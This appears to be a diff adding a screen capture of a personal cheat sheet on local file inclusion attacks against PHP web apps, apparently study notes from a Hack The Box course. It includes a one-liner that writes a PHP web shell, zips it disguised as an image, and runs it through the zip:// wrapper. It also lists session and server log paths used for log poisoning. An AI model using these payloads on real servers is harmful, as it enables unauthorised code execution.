@@ -1,0 +1,24 @@
+ 55 $
+ 56 # Run file via LFI$
+ 57 http://<SERVER_IP>:<PORT>/index.php?language=<path_to_file>&cmd=id$
+ 58 $
+ 59 ######################## Zip Upload #########################$
+ 60 # shell.jpg is the zip$
+ 61 # Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive     through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip arc    hives is allowed$  
+ 62 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php$
+ 63 http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id$
+ 64 $
+ 65 ######################## Phar Upload #########################$
+ 66 check: https://academy.hackthebox.com/module/23/section/1493$
+ 67 $
+ 68 ######################## Log poisoning #########################$
+ 69 ################ PHP Session poisoning ##################$
+ 70 # copy cookie from Inspect -> Storage$
+ 71 # include: /var/lib/php/sessions/sess_<cookie>$
+ 72 $
+ 73 ################ Server log poisoning ##################$
+ 74 # Apache2 log location: /var/log/apache2/access.log$
+ 75 # Nginx log location:   /var/log/nginx/$
+0x_lfi.txt                                                                                                  75,1           Bot
+                                                                                                                     
+
